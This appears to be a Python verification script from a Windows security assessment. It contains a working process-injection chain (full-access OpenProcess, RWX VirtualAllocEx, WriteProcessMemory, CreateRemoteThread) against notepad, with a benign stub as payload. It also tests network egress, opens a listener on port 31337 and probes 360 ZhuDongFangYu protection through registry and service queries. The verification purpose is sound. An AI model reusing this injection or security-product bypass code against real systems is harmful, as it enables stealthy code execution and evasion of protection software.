"""★ 核心结论复验：注入 / 网络 / 句柄旁路。

存在意义：第 45 轮发现一条核心结论（"可执行后缀被拦截"）是误判，
说明此前部分结论缺少对照实验。本测试把其余核心结论用可复现的
对照实验固定下来，防止同类误判再次发生。
"""
import os
import sys
import time
import ctypes
import socket
import subprocess
from ctypes import wintypes

sys.stdout.reconfigure(encoding="utf-8")

RESULTS = []


def check(name, ok, detail=""):
    RESULTS.append((name, ok))
    print("  [%s] %-46s %s" % ("通过" if ok else "失败", name, detail))


def find_pid(exe_name):
    out = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
                         capture_output=True, text=True).stdout
    for ln in out.splitlines():
        p = [x.strip('"') for x in ln.split('","')]
        if p and p[0].lower().startswith(exe_name.lower()):
            return int(p[1])
    return None


def test_injection():
    print("[A] 注入链条（漏洞 2）")
    k = ctypes.WinDLL("kernel32", use_last_error=True)
    k.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    k.OpenProcess.restype = wintypes.HANDLE
    k.VirtualAllocEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                                 ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    k.VirtualAllocEx.restype = ctypes.c_void_p
    k.WriteProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                                     ctypes.c_void_p, ctypes.c_size_t,
                                     ctypes.POINTER(ctypes.c_size_t)]
    k.WriteProcessMemory.restype = wintypes.BOOL
    k.CreateRemoteThread.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                                     ctypes.c_size_t, ctypes.c_void_p,
                                     ctypes.c_void_p, wintypes.DWORD,
                                     ctypes.c_void_p]
    k.CreateRemoteThread.restype = wintypes.HANDLE
    k.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    k.GetExitCodeThread.argtypes = [wintypes.HANDLE,
                                    ctypes.POINTER(wintypes.DWORD)]

    p = subprocess.Popen(["notepad.exe"])
    try:
        time.sleep(2)
        h = k.OpenProcess(0x1F0FFF, False, p.pid)
        check("OpenProcess(notepad) 成功", bool(h), "handle=0x%X" % (h or 0))
        if not h:
            return
        addr = k.VirtualAllocEx(h, None, 0x1000, 0x3000, 0x40)
        check("VirtualAllocEx(RWX) 成功", bool(addr), "addr=0x%X" % (addr or 0))
        if not addr:
            return
        sc = bytes([0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3])
        written = ctypes.c_size_t(0)
        ok = k.WriteProcessMemory(h, addr, sc, len(sc), ctypes.byref(written))
        check("WriteProcessMemory 成功", bool(ok) and written.value == 6,
              "written=%d" % written.value)
        th = k.CreateRemoteThread(h, None, 0, addr, None, 0, None)
        check("CreateRemoteThread 成功", bool(th), "thread=0x%X" % (th or 0))
        if th:
            k.WaitForSingleObject(th, 5000)
            ec = wintypes.DWORD(0)
            k.GetExitCodeThread(th, ctypes.byref(ec))
            check("线程退出码 == 0x1337（证明代码真的执行了）",
                  ec.value == 0x1337, "实际=0x%X" % ec.value)
    finally:
        p.kill()
    print()


def test_network():
    print("[B] 网络层（漏洞 3）")
    try:
        ip = socket.gethostbyname("www.baidu.com")
        check("DNS 解析外网域名", bool(ip), ip)
    except Exception as e:  # noqa: BLE001
        check("DNS 解析外网域名", False, type(e).__name__)

    try:
        s = socket.create_connection(("www.baidu.com", 80), timeout=8)
        s.sendall(b"HEAD / HTTP/1.0\r\nHost: www.baidu.com\r\n\r\n")
        d = s.recv(200)
        s.close()
        check("外网 TCP 80 可连通", b"200" in d, d.split(b"\r\n")[0].decode())
    except Exception as e:  # noqa: BLE001
        check("外网 TCP 80 可连通", False, type(e).__name__)

    try:
        srv = socket.socket()
        srv.bind(("0.0.0.0", 31337))
        srv.listen(1)
        srv.close()
        check("入站监听 0.0.0.0:31337", True, "绑定成功")
    except Exception as e:  # noqa: BLE001
        check("入站监听 0.0.0.0:31337", False, type(e).__name__)
    print()


def test_bypasses():
    print("[C] 绕过 ZhuDongFangYu 句柄封锁（漏洞 4）")
    pid = find_pid("ZhuDongFangYu")
    if pid is None:
        check("ZhuDongFangYu 在运行", False, "进程未找到")
        print()
        return
    print("      目标 PID=%d" % pid)

    # 先确认封锁确实存在（对照）
    k = ctypes.WinDLL("kernel32", use_last_error=True)
    k.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    k.OpenProcess.restype = wintypes.HANDLE
    h = k.OpenProcess(0x1F0FFF, False, pid)
    check("对照：OpenProcess 确实被拒", not h, "handle=0x%X" % (h or 0))

    # 旁路 1: tasklist
    out = subprocess.run(["tasklist", "/fi", "PID eq %d" % pid, "/fo", "csv", "/nh"],
                         capture_output=True, text=True).stdout
    check("旁路 tasklist 可读到进程名", "ZhuDongFangYu" in out,
          out.strip()[:40])

    # 旁路 2: NtQuerySystemInformation
    nt = ctypes.WinDLL("ntdll")
    nt.NtQuerySystemInformation.argtypes = [wintypes.ULONG, ctypes.c_void_p,
                                            wintypes.ULONG,
                                            ctypes.POINTER(wintypes.ULONG)]
    nt.NtQuerySystemInformation.restype = ctypes.c_long
    buf = ctypes.create_string_buffer(1024 * 1024)
    ret = wintypes.ULONG(0)
    st = nt.NtQuerySystemInformation(5, buf, len(buf), ctypes.byref(ret))
    st &= 0xFFFFFFFF
    check("旁路 NtQuerySystemInformation 成功", st == 0 and ret.value > 0,
          "NTSTATUS=0x%08X retlen=%d" % (st, ret.value))

    # 旁路 3: 注册表
    ps = ("(Get-ItemProperty "
          "'HKLM:\\SOFTWARE\\WOW6432Node\\360Safe\\safemon')"
          ".hips_defense_count")
    r = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                       capture_output=True, text=True, timeout=30)
    check("旁路 注册表读取成功", r.stdout.strip().isdigit(),
          "hips_defense_count=%s" % r.stdout.strip())

    # 旁路 4: 服务控制
    r2 = subprocess.run(["powershell", "-NoProfile", "-Command",
                         "(Get-Service ZhuDongFangYu).Status"],
                        capture_output=True, text=True, timeout=30)
    check("旁路 服务控制管理器成功", "Running" in r2.stdout,
          "状态=%s" % r2.stdout.strip())
    print()


def main():
    print("=" * 78)
    print("  核心结论复验：注入 / 网络 / 句柄旁路")
    print("=" * 78)
    print()
    test_injection()
    test_network()
    test_bypasses()

    passed = sum(1 for _, ok in RESULTS if ok)
    print("=" * 78)
    print("  总计: %d/%d 通过" % (passed, len(RESULTS)))
    print("=" * 78)
    return 0 if passed == len(RESULTS) else 1


if __name__ == "__main__":
    sys.exit(main())
